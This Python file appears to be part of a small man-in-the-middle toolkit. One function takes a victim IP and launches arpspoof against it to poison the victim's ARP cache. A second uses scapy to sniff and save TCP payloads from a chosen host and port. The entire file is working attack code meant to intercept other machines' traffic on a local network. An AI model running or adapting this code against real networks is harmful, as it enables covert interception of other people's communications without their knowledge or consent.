import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os

def arpoisoner(out_lck, myAddress):

    output(out_lck, "Arp Poisoner")

    victimIP = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimIP, myAddress))


def lel(array):

    def out_sniff(packet):
        array.append(bytes(packet[TCP].payload))
    return out_sniff


def analyzer(out_lck, port, extension):

    file = open("sniffed/pwndcifrato." + extension, "wb")

    output(out_lck, "Analizer")

    time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")

    destination = loop_input(out_lck, "Please insert destination IP: ")

    array = []
    result = []
    sniff(filter="tcp and port %s and host %s" % (port, "192.168." + destination), timeout=time, prn=lel(array))
    for idx, el in enumerate(array):
        if el not in result:
            result.append(el)

    for el in result:
        file.write(el)
    file.close()



